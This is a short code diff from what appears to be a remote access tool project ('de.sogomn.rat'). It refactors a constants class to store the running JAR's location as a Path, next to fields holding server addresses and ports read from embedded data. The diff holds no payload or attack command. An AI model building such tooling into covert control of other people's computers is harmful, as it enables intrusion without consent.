@@ -4,8 +4,9 @@
 
 package de.sogomn.rat.util;
 
-import java.io.File;
 import java.net.URISyntaxException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.ResourceBundle;
 
 import javax.swing.JDialog;
@@ -26,7 +27,7 @@ public final class Constants {
 	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
 	public static final String[] ADDRESSES;
 	public static final int[] PORTS;
-	public static final File JAR_FILE;
+	public static final Path JAR_FILE;
 	
 	static {
 		final byte[] data = FileUtils.readInternalData(DATA_PATH);
@@ -56,10 +57,10 @@ public final class Constants {
 	}
 	
 	static {
-		File jarFile = null;
+		Path jarFile = null;
 		
 		try {
-			jarFile = new File(Constants.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+			jarFile = Paths.get(Constants.class.getProtectionDomain().getCodeSource().getLocation().toURI());
 		} catch (final URISyntaxException ex) {
 			ex.printStackTrace();
 		}
